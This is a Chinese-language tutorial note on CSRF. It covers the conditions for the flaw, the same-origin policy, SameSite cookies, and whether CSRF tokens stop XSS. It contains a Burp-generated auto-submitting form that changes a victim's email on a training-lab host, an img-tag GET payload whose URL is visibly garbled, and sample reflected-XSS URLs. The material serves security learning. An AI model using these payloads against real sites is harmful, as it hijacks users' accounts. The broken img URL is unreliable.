# CSRF 漏洞概述

条件：

- 存在敏感动作：
  - 存在实际价值（如转账、修改密码）。
  - 通过 HTTP 触发。

- 敏感动作仅依赖 Cookie 的会话管理（未使用 csrf token、验证码）。
- 请求参数可预测。
  - 攻击者可以构造请求所需参数，无需未知参数。

csrf 不受同源策略的影响，因为同源策略限制的是 js 的 ajax 或 fetch 的请求，而 csrf 通常使用表单或超链接进行攻击，不受同源策略限制。但当目标机器的 set-cookie 属性 same-site 设置为 strict 的话，表单提交或超链接访问都不会携带 cookie 了。

通常情况下，csrf 通过表单进行 POST 请求攻击，通过超链接进行 GET 请求攻击。

### payload 在攻击者服务器上的 csrf 场景

修改受害者邮箱地址。

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0adc0069043741fd80d10dda00f70060.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiene&#64;attacked&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### payload 在第三方网站上的 csrf 场景

1. payload 部署在攻击者服务器上，同时将攻击者服务器作为超链接托管在评论区或其他地方。
2. payload 部署在第三方网站上，通常是 get 请求，如下：

```
<img src="https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/CSRF%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

### XSS 和 CSRF 区别

xss 允许攻击者在受害者用户的浏览器中执行任意 js 代码。

csrf 允许攻击者诱使受害者发送 HTTP 请求以执行他们不想执行的操作。

### CSRF Token 是否防止 XSS 

某些情况下可以，例如：

```
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
```

假设网站添加了 CSRF 令牌：

```
https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>/*+Bad+stuff+here...+*/</script>

# 用户需要进入页面才能受到 XSS 攻击，但是 CSRF 令牌错误，导致用户进不去页面，进而避免了攻击。
```

如果网站拒绝错误令牌的访问，那么它防止了 XSS 的攻击。

注：

- 如果网站其他位置存在可利用 XSS，那么它允许攻击者利用用户身份请求合法的 CSRF Token 访问此页面。

- CSRF Tocken 不能防止存储型 XSS，如果 CSRF 保护的页面存在存储型 XSS，XSS 可正常利用。
  - 这是因为用户先进入页面再触发的 XSS，用户进入页面的过程已经正常校验了 CSRF Tocken，以至于后续的 XSS 的利用。 

所以，CSRF Token 可以防止反射 XSS，但不能防止存储 XSS。